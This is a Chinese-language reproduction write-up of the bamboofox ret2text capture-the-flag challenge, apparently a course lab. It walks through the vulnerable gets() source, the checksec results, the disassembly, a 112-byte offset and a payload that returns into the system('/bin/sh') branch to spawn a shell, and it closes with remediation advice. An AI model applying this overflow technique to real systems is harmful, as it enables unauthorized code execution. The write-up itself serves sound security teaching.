# ret2text 复现记录

本记录复现课程表格中的 `ret2text`：通过栈溢出，把程序执行流程转到程序已有的目标代码。

配套程序：

```text
/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text/ret2text
```

这是一个本地教学二进制，只用于理解栈溢出和控制流劫持。

## 1. 程序分析

程序在 `main` 中使用无长度检查的 `gets(buf)`：

```c
void secure(void)
{
    int secretcode, input;
    srand(time(NULL));
    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("/bin/sh");
}

int main(void)
{
    char buf[100];
    gets(buf);
}
```

`gets` 可以覆盖 `main` 的保存返回地址。程序已经包含 `secure` 函数和 `system("/bin/sh")` 调用，所以无需注入 shellcode。

## 2. 防护检查

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text
chmod +x ret2text
file ret2text
checksec --file=ret2text
```

关键结果：

```text
ELF 32-bit LSB executable, Intel 80386
No canary found
NX enabled
No PIE (0x8048000)
Partial RELRO
```

## 3. 目标地址

`secure` 从 `0x080485fd` 开始，反汇编的关键部分如下：

```text
0x08048632: mov eax, [ebp-0x10]
0x08048635: cmp eax, [ebp-0xc]
0x08048638: jne 0x08048646
0x0804863a: mov DWORD PTR [esp], 0x08048763
0x08048641: call system@plt
```

所以目标地址是：

```text
0x0804863a
```

它位于校验成功分支的第一条指令。将返回地址改成这个地址后，CPU 会直接执行 `system("/bin/sh")`，跳过 `srand`、`rand`、`scanf` 和比较逻辑；因此不需要猜测随机数，也不需要额外输入验证码。

可用以下命令复核：

```bash
nm -n ret2text | rg ' secure| main'
objdump -d -Mintel ret2text | sed -n '/<secure>:/,/^$/p'
strings -a -t x ret2text | rg '/bin/sh'
```

## 4. 偏移计算

使用 32 位 cyclic pattern 覆盖返回地址后，GDB 中的 EIP 为 `0x62616164`：

```bash
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x62616164, n=4))
PY
```

结果为：

```text
112
```

因此 payload 布局是：

```text
112 字节填充 + p32(0x0804863a)
```

## 5. 复现步骤

```bash
cd /home/xyx/Desktop/ret2text_repro
python3 exploit.py
```

进入交互 shell 后输入：

```text
echo RET2TEXT_OK
```

成功输出：

```text
RET2TEXT_OK
```

也可以直接使用题库目录中的程序进行验证：

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2text/bamboofox-ret2text
chmod +x ret2text
printf 'echo RET2TEXT_OK\n' | python3 /home/xyx/Desktop/ret2text_repro/exploit.py
```

## 6. 修复建议

漏洞根源是 `gets` 的无界写入，应改用带长度限制的 `fgets`，并启用栈 canary、PIE、RELRO 和 NX。NX 不能阻止 ret2text，因为攻击者复用的是程序已有的代码；边界检查仍是根本修复。
